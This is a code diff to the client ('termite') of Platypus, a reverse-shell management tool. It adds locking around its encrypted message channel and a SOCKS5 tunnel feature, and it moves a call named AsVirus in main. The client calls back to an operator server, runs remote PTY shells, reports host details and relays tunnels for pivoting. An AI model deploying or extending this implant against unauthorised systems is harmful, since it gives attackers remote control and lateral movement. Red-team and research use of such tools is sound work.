@@ -14,6 +14,7 @@ import (
 	"path/filepath"
 	"runtime"
 	"strings"
+	"sync"
 	"syscall"
 	"time"
 
@@ -22,7 +23,9 @@ import (
 	"github.com/WangYihang/Platypus/lib/util/log"
 	"github.com/WangYihang/Platypus/lib/util/message"
 	"github.com/WangYihang/Platypus/lib/util/str"
+	"github.com/armon/go-socks5"
 	"github.com/creack/pty"
+	"github.com/phayes/freeport"
 	"github.com/sevlyar/go-daemon"
 )
 
@@ -72,11 +75,14 @@ type TermiteProcess struct {
 var processes map[string]*TermiteProcess
 var pullTunnels map[string]*net.Conn
 var pushTunnels map[string]*net.Conn
+var socks5ServerListener *net.Listener
 
 type Client struct {
-	Conn    *tls.Conn
-	Encoder *gob.Encoder
-	Decoder *gob.Decoder
+	Conn        *tls.Conn
+	Encoder     *gob.Encoder
+	Decoder     *gob.Decoder
+	EncoderLock *sync.Mutex
+	DecoderLock *sync.Mutex
 }
 
 func handleConnection(c *Client) {
@@ -84,7 +90,9 @@ func handleConnection(c *Client) {
 
 	for {
 		msg := &message.Message{}
+		c.DecoderLock.Lock()
 		err := c.Decoder.Decode(msg)
+		c.DecoderLock.Unlock()
 		if err != nil {
 			// Network
 			log.Error("Network error: %s", err)
@@ -142,6 +150,7 @@ func handleConnection(c *Client) {
 			log.Success("Process added: %v", processes)
 			defer func() { _ = ptmx.Close() }()
 
+			c.EncoderLock.Lock()
 			err = c.Encoder.Encode(message.Message{
 				Type: message.PROCESS_STARTED,
 				Body: message.BodyProcessStarted{
@@ -149,6 +158,7 @@ func handleConnection(c *Client) {
 					Pid: process.Process.Pid,
 				},
 			})
+			c.EncoderLock.Unlock()
 			if err != nil {
 				// Network
 				log.Error("Network error: %s", err)
@@ -161,6 +171,7 @@ func handleConnection(c *Client) {
 					n, err := ptmx.Read(buffer)
 					if err != nil {
 						if err == io.EOF {
+							c.EncoderLock.Lock()
 							err = c.Encoder.Encode(message.Message{
 								Type: message.PROCESS_STOPED,
 								Body: message.BodyProcessStoped{
@@ -168,6 +179,7 @@ func handleConnection(c *Client) {
 									Code: 0,
 								},
 							})
+							c.EncoderLock.Unlock()
 							if err != nil {
 								// Network
 								fmt.Println("Process stoped: %v", err)
@@ -178,6 +190,7 @@ func handleConnection(c *Client) {
 						break
 					}
 					if n > 0 {
+						c.EncoderLock.Lock()
 						err = c.Encoder.Encode(message.Message{
 							Type: message.STDIO,
 							Body: message.BodyStdio{
@@ -185,6 +198,7 @@ func handleConnection(c *Client) {
 								Data: buffer[0:n],
 							},
 						})
+						c.EncoderLock.Unlock()
 						if err != nil {
 							// Network
 							log.Error("Network error: %s", err)
@@ -204,6 +218,7 @@ func handleConnection(c *Client) {
 				}
 				fmt.Println("Exit code: ", exitCode)
 
+				c.EncoderLock.Lock()
 				err = c.Encoder.Encode(message.Message{
 					Type: message.PROCESS_STOPED,
 					Body: message.BodyProcessStoped{
@@ -211,6 +226,7 @@ func handleConnection(c *Client) {
 						Code: exitCode,
 					},
 				})
+				c.EncoderLock.Unlock()
 
 				if err != nil {
 					// Network
@@ -248,6 +264,7 @@ func handleConnection(c *Client) {
 				interfaces[i.Name] = i.HardwareAddr.String()
 			}
 
+			c.EncoderLock.Lock()
 			err = c.Encoder.Encode(message.Message{
 				Type: message.CLIENT_INFO,
 				Body: message.BodyClientInfo{
@@ -258,6 +275,7 @@ func handleConnection(c *Client) {
 					NetworkInterfaces: interfaces,
 				},
 			})
+			c.EncoderLock.Unlock()
 
 			if err != nil {
 				// Network
@@ -282,6 +300,7 @@ func handleConnection(c *Client) {
 			conn, err := net.Dial("tcp", address)
 			if err != nil {
 				log.Error(err.Error())
+				c.EncoderLock.Lock()
 				c.Encoder.Encode(message.Message{
 					Type: message.PULL_TUNNEL_CONNECT_FAILED,
 					Body: message.BodyPullTunnelConnectFailed{
@@ -289,13 +308,16 @@ func handleConnection(c *Client) {
 						Reason: err.Error(),
 					},
 				})
+				c.EncoderLock.Unlock()
 			} else {
+				c.EncoderLock.Lock()
 				err := c.Encoder.Encode(message.Message{
 					Type: message.PULL_TUNNEL_CONNECTED,
 					Body: message.BodyPullTunnelConnected{
 						Token: token,
 					},
 				})
+				c.EncoderLock.Unlock()
 
 				if err != nil {
 					log.Error(err.Error())
@@ -307,16 +329,19 @@ func handleConnection(c *Client) {
 							n, err := conn.Read(buffer)
 							if err != nil {
 								log.Success("Tunnel (%s) disconnected: %s", token, err.Error())
+								c.EncoderLock.Lock()
 								c.Encoder.Encode(message.Message{
 									Type: message.PULL_TUNNEL_DISCONNECTED,
 									Body: message.BodyPullTunnelDisconnected{
 										Token: token,
 									},
 								})
+								c.EncoderLock.Unlock()
 								conn.Close()
 								break
 							} else {
 								if n > 0 {
+									c.EncoderLock.Lock()
 									c.Encoder.Encode(message.Message{
 										Type: message.PULL_TUNNEL_DATA,
 										Body: message.BodyPullTunnelData{
@@ -324,6 +349,7 @@ func handleConnection(c *Client) {
 											Data:  buffer[0:n],
 										},
 									})
+									c.EncoderLock.Unlock()
 								}
 							}
 						}
@@ -347,12 +373,14 @@ func handleConnection(c *Client) {
 				log.Info("Closing conntion: %s", (*conn).RemoteAddr().String())
 				(*conn).Close()
 				delete(pullTunnels, token)
+				c.EncoderLock.Lock()
 				c.Encoder.Encode(message.Message{
 					Type: message.PULL_TUNNEL_DISCONNECTED,
 					Body: message.BodyPullTunnelDisconnected{
 						Token: token,
 					},
 				})
+				c.EncoderLock.Unlock()
 			} else {
 				log.Debug("No such tunnel: %s", token)
 			}
@@ -362,6 +390,7 @@ func handleConnection(c *Client) {
 			server, err := net.Listen("tcp", address)
 			if err != nil {
 				log.Error("Server (%s) create failed: %s", address, err.Error())
+				c.EncoderLock.Lock()
 				c.Encoder.Encode(message.Message{
 					Type: message.PUSH_TUNNEL_CREATE_FAILED,
 					Body: message.BodyPushTunnelCreateFailed{
@@ -369,14 +398,17 @@ func handleConnection(c *Client) {
 						Reason:  err.Error(),
 					},
 				})
+				c.EncoderLock.Unlock()
 			} else {
-				log.Error("Server created (%s)", address)
+				log.Success("Server created (%s)", address)
+				c.EncoderLock.Lock()
 				c.Encoder.Encode(message.Message{
 					Type: message.PUSH_TUNNEL_CREATED,
 					Body: message.BodyPushTunnelCreated{
 						Address: address,
 					},
 				})
+				c.EncoderLock.Unlock()
 
 				go func() {
 					for {
@@ -384,6 +416,7 @@ func handleConnection(c *Client) {
 						token := str.RandomString(0x10)
 						log.Success("Connection came from: %s", conn.RemoteAddr().String())
 						if err == nil {
+							c.EncoderLock.Lock()
 							c.Encoder.Encode(message.Message{
 								Type: message.PUSH_TUNNEL_CONNECT,
 								Body: message.BodyPushTunnelConnect{
@@ -391,6 +424,7 @@ func handleConnection(c *Client) {
 									Address: address,
 								},
 							})
+							c.EncoderLock.Unlock()
 							pushTunnels[token] = &conn
 						}
 					}
@@ -406,6 +440,7 @@ func handleConnection(c *Client) {
 						n, err := (*conn).Read(buffer)
 						if err != nil {
 							log.Error("Read from (%s) failed: %s", token, err.Error())
+							c.EncoderLock.Lock()
 							c.Encoder.Encode(message.Message{
 								Type: message.PUSH_TUNNEL_DISCONNECTED,
 								Body: message.BodyPushTunnelDisonnected{
@@ -413,11 +448,13 @@ func handleConnection(c *Client) {
 									Reason: err.Error(),
 								},
 							})
+							c.EncoderLock.Unlock()
 							(*conn).Close()
 							delete(pushTunnels, token)
 							break
 						} else {
 							log.Debug("%d bytes read from (%s)", n, token)
+							c.EncoderLock.Lock()
 							c.Encoder.Encode(message.Message{
 								Type: message.PUSH_TUNNEL_DATA,
 								Body: message.BodyPushTunnelData{
@@ -425,6 +462,7 @@ func handleConnection(c *Client) {
 									Data:  buffer[0:n],
 								},
 							})
+							c.EncoderLock.Unlock()
 						}
 					}
 				}()
@@ -459,8 +497,78 @@ func handleConnection(c *Client) {
 			} else {
 				log.Debug("No such tunnel (PUSH_TUNNEL_DATA): %s", token)
 			}
+		case message.DYNAMIC_TUNNEL_CREATE:
+			port, err := StartSocks5Server()
+			if err != nil {
+				c.EncoderLock.Lock()
+				c.Encoder.Encode(message.Message{
+					Type: message.DYNAMIC_TUNNEL_CREATE_FAILED,
+					Body: message.BodyDynamicTunnelCreateFailed{
+						Reason: err.Error(),
+					},
+				})
+				c.EncoderLock.Unlock()
+			} else {
+				c.EncoderLock.Lock()
+				c.Encoder.Encode(message.Message{
+					Type: message.DYNAMIC_TUNNEL_CREATED,
+					Body: message.BodyDynamicTunnelCreated{
+						Port: port,
+					},
+				})
+				c.EncoderLock.Unlock()
+			}
+		case message.DYNAMIC_TUNNEL_DESTROY:
+			err := StopSocks5Server()
+			if err != nil {
+				log.Error("StopSocks5Server() failed: %s", err.Error())
+				c.EncoderLock.Lock()
+				c.Encoder.Encode(message.Message{
+					Type: message.DYNAMIC_TUNNEL_DESTROY_FAILED,
+					Body: message.BodyDynamicTunnelDestroyFailed{
+						Reason: err.Error(),
+					},
+				})
+				c.EncoderLock.Unlock()
+			} else {
+				c.EncoderLock.Lock()
+				c.Encoder.Encode(message.Message{
+					Type: message.DYNAMIC_TUNNEL_DESTROIED,
+					Body: message.BodyDynamicTunnelDestroied{},
+				})
+				c.EncoderLock.Unlock()
+				socks5ServerListener = nil
+			}
 		}
 	}
+}
+
+func StartSocks5Server() (int, error) {
+	// Generate random port
+	port, err := freeport.GetFreePort()
+	if err != nil {
+		return -1, err
+	}
+	log.Success("Port: %d", port)
+	addr := fmt.Sprintf("127.0.0.1:%d", port)
+	// Create tcp listener
+	socks5ServerListener, err := net.Listen("tcp", addr)
+	if err != nil {
+		return -1, err
+	}
+	// Create socks5 server
+	server, err := socks5.New(&socks5.Config{})
+	if err != nil {
+		return -1, err
+	}
+	// Start socks5 server
+	go server.Serve(socks5ServerListener)
+	log.Success("Socks server started at: %s", addr)
+	return port, nil
+}
+
+func StopSocks5Server() error {
+	return (*socks5ServerListener).Close()
 }
 
 func StartClient(service string) bool {
@@ -498,9 +606,11 @@ func StartClient(service string) bool {
 		log.Success("Secure connection established on %s", conn.RemoteAddr())
 
 		c := &Client{
-			Conn:    conn,
-			Encoder: gob.NewEncoder(conn),
-			Decoder: gob.NewDecoder(conn),
+			Conn:        conn,
+			Encoder:     gob.NewEncoder(conn),
+			Decoder:     gob.NewDecoder(conn),
+			EncoderLock: &sync.Mutex{},
+			DecoderLock: &sync.Mutex{},
 		}
 		handleConnection(c)
 		return needRetry
@@ -535,19 +645,22 @@ func AsVirus() {
 }
 
 func main() {
-	release := true
-	if release {
-		AsVirus()
-	}
 	message.RegisterGob()
 	backoff = CreateBackOff()
 	processes = map[string]*TermiteProcess{}
 	pullTunnels = map[string]*net.Conn{}
 	pushTunnels = map[string]*net.Conn{}
 	service := "127.0.0.1:13337"
+	release := true
+
 	if release {
 		service = strings.Trim("xxx.xxx.xxx.xxx:xxxxx", " ")
 	}
+
+	if release {
+		AsVirus()
+	}
+
 	for {
 		if !StartClient(service) {
 			break
